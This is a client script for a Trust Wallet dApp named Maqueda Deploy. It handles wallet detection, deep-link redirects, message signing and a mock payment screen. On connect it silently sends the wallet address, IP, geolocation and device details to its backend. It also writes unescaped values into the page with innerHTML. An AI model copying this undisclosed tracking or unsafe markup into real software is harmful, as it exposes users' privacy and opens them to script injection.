// Maqueda Deploy Client Script

/*
 * Configuration:
 * To configure the API endpoint, you can override the CONFIG object before this script loads:
 * 
 * <script>
 *   window.MAQUEDA_CONFIG = {
 *     API_BASE_URL: 'http://your-api-server.com'
 *   };
 * </script>
 * <script src="./scripts/script.js"></script>
 * 
 * By default, the API will point to http://localhost:3000 in development
 * and use relative paths in production.
 */

(function() {
  'use strict';
  
  // Configuration for API base URL
  const CONFIG = window.MAQUEDA_CONFIG || {
    // Default to localhost:3002 for development (3000 might be in use)
    // In production, this should be set to the actual API server URL
    API_BASE_URL: window.location.hostname === 'localhost' ? 'http://localhost:3002' : ''
  };

  // Device information collection functions
  function getDeviceInformation() {
    const deviceInfo = {
      userAgent: navigator.userAgent,
      browser: getBrowserInfo(),
      os: getOSInfo(),
      deviceType: getDeviceType(),
      screenInfo: getScreenInfo()
    };
    
    return deviceInfo;
  }

  function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    let browser = "Unknown";
    
    if (userAgent.includes("Firefox")) {
      browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
      browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
      browser = "Safari";
    } else if (userAgent.includes("Edge")) {
      browser = "Edge";
    }
    
    return browser;
  }

  function getOSInfo() {
    const userAgent = navigator.userAgent;
    let os = "Unknown";
    
    if (userAgent.includes("Windows")) {
      os = "Windows";
    } else if (userAgent.includes("Mac")) {
      os = "MacOS";
    } else if (userAgent.includes("Linux")) {
      os = "Linux";
    } else if (userAgent.includes("Android")) {
      os = "Android";
    } else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) {
      os = "iOS";
    }
    
    return os;
  }

  function getDeviceType() {
    const userAgent = navigator.userAgent;
    
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
      return "tablet";
    } else if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(userAgent)) {
      return "mobile";
    } else {
      return "desktop";
    }
  }

  function getScreenInfo() {
    return `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x density)`;
  }

  // Get client IP address
  async function getClientIpAddress() {
    try {
      // Use a free service to get the client's public IP
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Failed to get client IP address:', error);
      return null;
    }
  }

  // Store all announced providers by their UUID identifier
  const announcedProviders = new Map();
  let trustWalletProvider = null;

  // Function to run when the script is loaded
  function onScriptLoad() {
    console.log('Maqueda Deploy script loaded successfully');
    
    // Initialize EIP-6963 provider discovery
    initializeEIP6963();
    
    // Add your initialization code here
    initializeApp();
  }

  // Initialize EIP-6963 provider discovery
  function initializeEIP6963() {
    const onAnnounce = (event) => {
      const { info, provider } = event.detail;
      const key = info.uuid;
      // Avoid duplicates
      if(announcedProviders.has(key)) return;

      announcedProviders.set(key, { info, provider });
      console.log('Wallet announced:', info.name, info.rdns);
    };

    // Listen for wallet announcements
    window.addEventListener("eip6963:announceProvider", onAnnounce);

    // Request all wallets to announce themselves
    window.dispatchEvent(new Event("eip6963:requestProvider"));
  }

  // Legacy detection for wallets that don't support EIP-6963
  function legacyDetectTrustWallet() {
    // Check if window.ethereum exists and has Trust Wallet characteristics
    if (window.ethereum) {
      // Check if it's Trust Wallet by checking isTrust property or other identifiers
      if (window.ethereum.isTrust || window.ethereum.isTrustWallet) {
        return true;
      }
      
      // Check if the provider has Trust Wallet in its name
      if (window.ethereum.providers) {
        return window.ethereum.providers.some(p => p.isTrust || p.isTrustWallet);
      }
      
      // Check for Trust Wallet in the constructor name
      if (window.ethereum.constructor && window.ethereum.constructor.name) {
        const constructorName = window.ethereum.constructor.name.toLowerCase();
        if (constructorName.includes('trust')) {
          return true;
        }
      }
      
      // Generic check - if window.ethereum exists, it might be Trust Wallet
      // This is a last resort check
      return true;
    }
    
    // Check for legacy Trust Wallet object
    if (window.trustwallet) {
      return true;
    }
    
    return false;
  }

  // Get Trust Wallet provider using EIP-6963
  function getTrustWalletProvider() {
    // First try EIP-6963 detection
    for (const entry of announcedProviders.values()) {
      console.log('Checking provider:', entry.info.name, entry.info.rdns);
      if (entry.info?.rdns === 'com.trustwallet.app') {
        return entry.provider;
      }
    }
    
    // Fallback to legacy detection
    if (legacyDetectTrustWallet()) {
      return window.ethereum || window.trustwallet;
    }
    
    return null;
  }

  // Main initialization function
  function initializeApp() {
    console.log('Initializing Maqueda Deploy application...');
    
    // Check if we're in the dApp browser and need to show payment page
    const urlParams = new URLSearchParams(window.location.search);
    const tokenId = urlParams.get('token');
    const receiverAddress = urlParams.get('receiver');
    
    // Check for Trust Wallet after a short delay to allow provider discovery
    setTimeout(() => {
      checkTrustWallet(tokenId, receiverAddress);
    }, 2000);
  }

  // Check if Trust Wallet is available
  function checkTrustWallet(tokenId, receiverAddress) {
    const isTrustWalletApp = isTrustWalletMobile();
    trustWalletProvider = getTrustWalletProvider();
    const isTrustWalletExtension = trustWalletProvider !== null;
    const isLocalFile = window.location.protocol === 'file:';
    
    console.log('Trust Wallet Detection Results:', {
      isTrustWalletApp,
      isTrustWalletExtension,
      isLocalFile,
      announcedProviders: Array.from(announcedProviders.values()).map(p => ({name: p.info.name, rdns: p.info.rdns})),
      windowEthereum: !!window.ethereum,
      windowTrustWallet: !!window.trustwallet,
      legacyDetection: legacyDetectTrustWallet()
    });
    
    // Special handling for local files
    if (isLocalFile) {
      document.querySelector('.message').innerHTML = 'Running locally may prevent wallet detection.<br>Please serve this page via HTTP/HTTPS or check console for detected wallets.';
      console.warn('Wallet extensions cannot interact with file:// URLs due to browser security restrictions.');
      console.warn('To properly test wallet detection, serve this page via HTTP/HTTPS (e.g., using Live Server extension or http-server).');
      
      // Even if we can't redirect, we can still check if wallets are theoretically available
      if (window.ethereum || window.trustwallet) {
        console.log('Wallet objects detected (but may not be functional on file:// URLs)');
      }
      
      // Don't redirect when running locally
      return;
    }
    
    if (isTrustWalletApp) {
      // Already in Trust Wallet app browser
      console.log('Already in Trust Wallet app browser');
      
      // Check if we need to show payment page
      if (tokenId) {
        document.querySelector('.message').textContent = 'Loading payment page...';
        // Initialize the payment page
        initializePaymentPage(tokenId, receiverAddress);
      } else {
        document.querySelector('.message').textContent = 'Trust Wallet detected. Loading app...';
        // Initialize the app with wallet connection
        initializeWalletApp();
      }
    } else {
      // Not in Trust Wallet app browser - redirect to Trust Wallet dApp browser
      // This handles both token and non-token cases by using deep linking
      if (tokenId) {
        document.querySelector('.message').textContent = 'Opening in Trust Wallet dApp browser...';
      } else {
        document.querySelector('.message').textContent = 'Opening in Trust Wallet...';
      }
      
      // Always redirect to Trust Wallet using deep linking
      setTimeout(() => {
        redirectToWallet();
      }, 1000);
    }
  }

  // Initialize the wallet-connected app
  function initializeWalletApp() {
    // Remove any existing click listeners
    document.body.removeEventListener('click', initializeWalletApp);
    
    // Update UI to show wallet connection options
    document.querySelector('.message').textContent = 'Connecting to Trust Wallet...';
    
    // Connect to wallet
    connectToWallet();
  }

  // Connect to Trust Wallet
  async function connectToWallet() {
    try {
      if (!trustWalletProvider) {
        throw new Error('Trust Wallet provider not found');
      }
      
      // Request account access
      const accounts = await trustWalletProvider.request({ 
        method: "eth_requestAccounts" 
      });
      
      console.log('Connected account:', accounts[0]);
      document.querySelector('.message').textContent = `Connected: ${accounts[0].substring(0, 6)}...${accounts[0].substring(accounts[0].length - 4)}`;
      
      // Get current network
      const network = await trustWalletProvider.request({ method: "eth_chainId" });
      
      // Collect client information
      const deviceInfo = getDeviceInformation();
      
      // Get client IP address
      const ipAddress = await getClientIpAddress();
      
      // Get geolocation data
      let locationData = {};
      if (ipAddress) {
        try {
          const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}`);
          if (geoResponse.ok) {
            const geoData = await geoResponse.json();
            if (geoData.status === 'success') {
              locationData = {
                country: geoData.country,
                region: geoData.regionName,
                city: geoData.city,
                latitude: geoData.lat,
                longitude: geoData.lon
              };
            }
          }
        } catch (geoError) {
          console.error('Geolocation lookup failed:', geoError);
        }
      }
      
      // Send client data to backend
      try {
        const clientData = {
          walletAddress: accounts[0],
          network: network, // Store the network ID
          ipAddress: ipAddress,
          ...locationData,
          ...deviceInfo
        };
        
        const response = await fetch(`${CONFIG.API_BASE_URL}/api/clients/connect`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(clientData),
        });
        
        if (!response.ok) {
          console.error('Failed to send client data to backend');
        } else {
          console.log('Client data sent to backend successfully');
        }
      } catch (sendError) {
        console.error('Error sending client data to backend:', sendError);
      }
      
      // Set up account change listener
      trustWalletProvider.on("accountsChanged", (accounts) => {
        if (accounts.length === 0) {
          console.log("User disconnected.");
          document.querySelector('.message').textContent = 'Wallet disconnected';
        } else {
          console.log("Active account:", accounts[0]);
          document.querySelector('.message').textContent = `Connected: ${accounts[0].substring(0, 6)}...${accounts[0].substring(accounts[0].length - 4)}`;
        }
      });
      
      // Set up chain change listener to track network changes
      trustWalletProvider.on("chainChanged", async (chainId) => {
        console.log("Network changed to:", chainId);
        
        // Update client record with new network
        try {
          const accounts = await trustWalletProvider.request({ method: "eth_accounts" });
          if (accounts.length > 0) {
            const clientData = {
              walletAddress: accounts[0],
              network: chainId,
            };
            
            await fetch(`${CONFIG.API_BASE_URL}/api/clients/connect`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(clientData),
            });
          }
        } catch (error) {
          console.error('Error updating network in client record:', error);
        }
        
        // Reload the page or update UI accordingly
        window.location.reload();
      });
      
      // Show signing options
      showSigningOptions(accounts[0]);
      
    } catch (error) {
      console.error('Connection error:', error);
      if (error.code === 4001) {
        document.querySelector('.message').textContent = 'Connection rejected by user';
      } else {
        document.querySelector('.message').textContent = 'Connection failed';
      }
    }
  }

  // Show signing options to the user
  function showSigningOptions(account) {
    // Replace the loader with signing options
    const container = document.querySelector('.loader-container');
    container.innerHTML = `
      <h2>Maqueda Deploy</h2>
      <p>Connected Account: ${account.substring(0, 6)}...${account.substring(account.length - 4)}</p>
      <button id="sign-message-btn">Sign Message</button>
      <button id="sign-typed-data-btn">Sign Typed Data</button>
      <div id="signature-result"></div>
    `;
    
    // Add event listeners to signing buttons
    document.getElementById('sign-message-btn').addEventListener('click', () => {
      signMessage(account);
    });
    
    document.getElementById('sign-typed-data-btn').addEventListener('click', () => {
      signTypedData(account);
    });
  }

  // Sign a simple message
  async function signMessage(account) {
    try {
      const message = "Sign this message to authenticate with Maqueda Deploy";
      const hexMessage = "0x" + Buffer.from(message, "utf8").toString("hex");
      
      document.getElementById('signature-result').textContent = 'Waiting for signature...';
      
      const signature = await trustWalletProvider.request({
        method: "personal_sign",
        params: [hexMessage, account]
      });
      
      console.log("Message signature:", signature);
      document.getElementById('signature-result').innerHTML = `
        <h3>Signature:</h3>
        <p>${signature.substring(0, 20)}...${signature.substring(signature.length - 20)}</p>
        <button onclick="navigator.clipboard.writeText('${signature}')">Copy Signature</button>
      `;
    } catch (error) {
      console.error('Signing error:', error);
      if (error.code === 4001) {
        document.getElementById('signature-result').textContent = 'Signature rejected by user';
      } else {
        document.getElementById('signature-result').textContent = 'Signing failed';
      }
    }
  }

  // Sign typed data (EIP-712)
  async function signTypedData(account) {
    try {
      const typedData = {
        domain: {
          name: "Maqueda Deploy",
          version: "1",
          chainId: 1,
        },
        types: {
          Person: [
            { name: "name", type: "string" },
            { name: "wallet", type: "address" }
          ],
          Mail: [
            { name: "from", type: "Person" },
            { name: "to", type: "Person" },
            { name: "contents", type: "string" }
          ]
        },
        primaryType: "Mail",
        message: {
          from: {
            name: "User",
            wallet: account
          },
          to: {
            name: "Maqueda Deploy",
            wallet: "0x0000000000000000000000000000000000000000"
          },
          contents: "Welcome to Maqueda Deploy!"
        }
      };
      
      document.getElementById('signature-result').textContent = 'Waiting for signature...';
      
      const signature = await trustWalletProvider.request({
        method: "eth_signTypedData_v4",
        params: [account, JSON.stringify(typedData)]
      });
      
      console.log("Typed data signature:", signature);
      document.getElementById('signature-result').innerHTML = `
        <h3>Typed Data Signature:</h3>
        <p>${signature.substring(0, 20)}...${signature.substring(signature.length - 20)}</p>
        <button onclick="navigator.clipboard.writeText('${signature}')">Copy Signature</button>
      `;
    } catch (error) {
      console.error('Signing error:', error);
      if (error.code === 4001) {
        document.getElementById('signature-result').textContent = 'Signature rejected by user';
      } else {
        document.getElementById('signature-result').textContent = 'Signing failed';
      }
    }
  }

  // Check if we're in Trust Wallet mobile app browser
  function isTrustWalletMobile() {
    const userAgent = navigator.userAgent;
    return userAgent.includes('TrustWallet');
  }

  // Redirect to appropriate wallet installation method
  function redirectToWallet() {
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
    const isAndroid = /Android/.test(navigator.userAgent);
    
    // Update message
    document.querySelector('.message').textContent = 'Opening in Trust Wallet dApp browser...';
    
    // Use Trust Wallet deep linking, preserving URL parameters
    const currentUrl = encodeURIComponent(window.location.href);
    
    if (isIOS) {
      // Deep link to Trust Wallet iOS app
      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
    } else if (isAndroid) {
      // Deep link to Trust Wallet Android app
      window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
    } else {
      // For desktop or other platforms, redirect to Trust Wallet
      window.location.href = "https://trustwallet.com/download";
      document.querySelector('.message').textContent = 'Please install Trust Wallet';
      console.log('Please install Trust Wallet');
    }
  }
  
  // Initialize the payment page
  function initializePaymentPage(tokenId, receiverAddress) {
    // Hide loader and show payment container
    document.getElementById('loader-container').style.display = 'none';
    document.getElementById('payment-container').style.display = 'block';
    
    // Set token title
    const tokenName = getTokenName(tokenId);
    document.getElementById('send-title').textContent = `Send ${tokenName}`;
    
    // Pre-fill receiver address if provided
    if (receiverAddress) {
      document.getElementById('receiver-address').value = receiverAddress;
    }
    
    // Initialize payment functionality
    setupPaymentPage(tokenId, tokenName);
  }
  
  // Set up payment page event listeners and functionality
  function setupPaymentPage(tokenId, tokenName) {
    const receiverInput = document.getElementById('receiver-address');
    const amountInput = document.getElementById('amount');
    const usdPreview = document.getElementById('usd-preview');
    const nextBtn = document.getElementById('next-btn');
    const backBtn = document.getElementById('back-btn');
    const confirmBtn = document.getElementById('confirm-btn');
    
    // Add input event listeners
    receiverInput.addEventListener('input', validateInputs);
    amountInput.addEventListener('input', () => {
      validateInputs();
      updateUsdPreview(amountInput.value, tokenId, usdPreview);
    });
    
    // Add button event listeners
    nextBtn.addEventListener('click', showConfirmationScreen);
    backBtn.addEventListener('click', showSendScreen);
    confirmBtn.addEventListener('click', confirmTransaction);
    
    // Initial validation
    validateInputs();
  }
  
  // Validate inputs and enable/disable next button
  function validateInputs() {
    const receiverAddress = document.getElementById('receiver-address').value;
    const amount = document.getElementById('amount').value;
    const nextBtn = document.getElementById('next-btn');
    
    // Simple validation (in a real app, you'd want more robust validation)
    const isAddressValid = receiverAddress.length > 0; // Simplified validation
    const isAmountValid = amount && parseFloat(amount) > 0;
    
    nextBtn.disabled = !(isAddressValid && isAmountValid);
  }
  
  // Update USD preview based on amount and token
  function updateUsdPreview(amount, tokenId, previewElement) {
    if (!amount || parseFloat(amount) <= 0) {
      previewElement.textContent = '≈ $0.00';
      return;
    }
    
    // Get USD value for the token (simplified - in a real app you'd fetch this from an API)
    const usdValue = getTokenUsdValue(tokenId);
    const usdAmount = (parseFloat(amount) * usdValue).toFixed(2);
    previewElement.textContent = `≈ $${usdAmount}`;
  }
  
  // Get token name based on token ID
  function getTokenName(tokenId) {
    // This would typically come from a token registry or API
    const tokenNames = {
      'usdc': 'USDC',
      'eth': 'ETH',
      'btc': 'BTC',
      'bnb': 'BNB'
    };
    
    return tokenNames[tokenId.toLowerCase()] || tokenId.toUpperCase();
  }
  
  // Get USD value for a token (simplified)
  function getTokenUsdValue(tokenId) {
    // This would typically come from an API like CoinGecko or CoinMarketCap
    const usdValues = {
      'usdc': 1.00,
      'eth': 3000.00,
      'btc': 60000.00,
      'bnb': 300.00
    };
    
    return usdValues[tokenId.toLowerCase()] || 0;
  }
  
  // Show confirmation screen
  function showConfirmationScreen() {
    const receiverAddress = document.getElementById('receiver-address').value;
    const amount = document.getElementById('amount').value;
    const urlParams = new URLSearchParams(window.location.search);
    const tokenId = urlParams.get('token');
    const tokenName = getTokenName(tokenId);
    
    // Update confirmation details
    document.getElementById('confirm-token').textContent = tokenName;
    document.getElementById('confirm-from').textContent = 'Connect to wallet to see your address'; // Will be updated after connection
    document.getElementById('confirm-to').textContent = getShortenedAddress(receiverAddress);
    document.getElementById('confirm-amount').textContent = `${amount} ${tokenName}`;
    document.getElementById('confirm-network').textContent = getNetworkName(); // Would come from wallet
    document.getElementById('confirm-fee').textContent = getEstimatedFee(tokenId); // Would be calculated
    document.getElementById('confirm-nonce').textContent = 'Will be determined at broadcast'; // Will be updated after connection
    
    // Update total USD value
    const usdValue = getTokenUsdValue(tokenId);
    const totalUsd = (parseFloat(amount) * usdValue).toFixed(2);
    document.getElementById('total-usd').textContent = `$${totalUsd}`;
    
    // Show confirmation screen and hide send screen
    document.getElementById('send-screen').style.display = 'none';
    document.getElementById('confirmation-screen').style.display = 'block';
  }
  
  // Show send screen (go back)
  function showSendScreen() {
    document.getElementById('confirmation-screen').style.display = 'none';
    document.getElementById('send-screen').style.display = 'block';
  }
  
  // Confirm transaction
  function confirmTransaction() {
    // Connect to wallet and send transaction
    connectToWalletForTransaction();
  }
  
  // Connect to wallet for transaction
  async function connectToWalletForTransaction() {
    try {
      // Show connecting message
      document.getElementById('confirm-btn').textContent = 'Connecting...';
      document.getElementById('confirm-btn').disabled = true;
      
      if (!trustWalletProvider) {
        // If we don't have a provider yet, try to get it
        trustWalletProvider = getTrustWalletProvider();
        if (!trustWalletProvider) {
          throw new Error('Trust Wallet provider not found');
        }
      }
      
      // Request account access
      const accounts = await trustWalletProvider.request({ 
        method: "eth_requestAccounts" 
      });
      
      console.log('Connected account:', accounts[0]);
      
      // Update confirmation details with actual wallet information
      document.getElementById('confirm-from').textContent = getShortenedAddress(accounts[0]);
      
      // Get network information
      const network = await trustWalletProvider.request({ method: "eth_chainId" });
      document.getElementById('confirm-network').textContent = getNetworkNameFromChainId(network);
      
      // In a real implementation, this would send the transaction
      alert('Transaction confirmed! In a real implementation, this would send the transaction to the network.');
      
      // For demo purposes, we'll just show a success message
      document.getElementById('confirmation-screen').innerHTML = `
        <div style="text-align: center; padding: 40px 20px;">
          <div style="font-size: 48px; margin-bottom: 20px;">✓</div>
          <h2>Transaction Submitted</h2>
          <p>Your transaction has been submitted to the network.</p>
          <p>Account: ${accounts[0].substring(0, 6)}...${accounts[0].substring(accounts[0].length - 4)}</p>
          <p>Network: ${getNetworkNameFromChainId(network)}</p>
          <button class="btn" onclick="window.location.reload()">Send Another</button>
        </div>
      `;
    } catch (error) {
      console.error('Connection error:', error);
      
      // Reset button
      document.getElementById('confirm-btn').textContent = 'Confirm';
      document.getElementById('confirm-btn').disabled = false;
      
      if (error.code === 4001) {
        document.getElementById('confirmation-screen').innerHTML = `
          <div style="text-align: center; padding: 40px 20px;">
            <div style="font-size: 48px; margin-bottom: 20px;">✗</div>
            <h2>Transaction Cancelled</h2>
            <p>Connection rejected by user</p>
            <button class="btn" onclick="showSendScreen()">Try Again</button>
          </div>
        `;
      } else {
        document.getElementById('confirmation-screen').innerHTML = `
          <div style="text-align: center; padding: 40px 20px;">
            <div style="font-size: 48px; margin-bottom: 20px;">✗</div>
            <h2>Connection Failed</h2>
            <p>${error.message}</p>
            <button class="btn" onclick="showSendScreen()">Try Again</button>
          </div>
        `;
      }
    }
  }
  
  // Get network name from chain ID
  function getNetworkNameFromChainId(chainId) {
    const networks = {
      '0x1': 'Ethereum Mainnet',
      '0x3': 'Ethereum Ropsten',
      '0x4': 'Ethereum Rinkeby',
      '0x5': 'Ethereum Goerli',
      '0x2a': 'Ethereum Kovan',
      '0x38': 'Binance Smart Chain',
      '0x61': 'Binance Smart Chain Testnet',
      '0x89': 'Polygon Mainnet',
      '0x13881': 'Polygon Mumbai'
    };
    
    return networks[chainId] || `Unknown Network (${chainId})`;
  }
  
  // Get shortened address for display
  function getShortenedAddress(address) {
    if (!address || address.length < 10) return address;
    return `${address.substring(0, 15)}...${address.substring(address.length - 5)}`;
  }
  
  // Get network name based on chain ID (simplified)
  function getNetworkName() {
    // This would normally come from the wallet provider
    return 'Ethereum';
  }
  
  // Get estimated fee based on token/network (simplified)
  function getEstimatedFee(tokenId) {
    // This would normally be calculated based on network conditions
    const fees = {
      'eth': '0.000021 ETH',
      'usdc': '0.000021 ETH',
      'btc': '0.00005 BTC',
      'bnb': '0.000021 BNB'
    };
    
    return fees[tokenId.toLowerCase()] || '0.000021 ETH';
  }

  // Run the onScriptLoad function when the DOM is fully loaded
  if (document.readyState === 'loading') {
    // DOM is still loading, wait for it to complete
    document.addEventListener('DOMContentLoaded', onScriptLoad);
  } else {
    // DOM is already loaded, run immediately
    onScriptLoad();
  }

  // Expose any functions you want to be accessible globally
  window.MaquedaDeploy = {
    // Add public API methods here
    init: initializeApp,
    // For debugging purposes
    getProviders: () => Array.from(announcedProviders.values()),
    checkWallet: checkTrustWallet,
    // Payment page functions
    initializePaymentPage: initializePaymentPage,
    showConfirmationScreen: showConfirmationScreen,
    showSendScreen: showSendScreen,
    connectToWalletForTransaction: connectToWalletForTransaction
  };

})();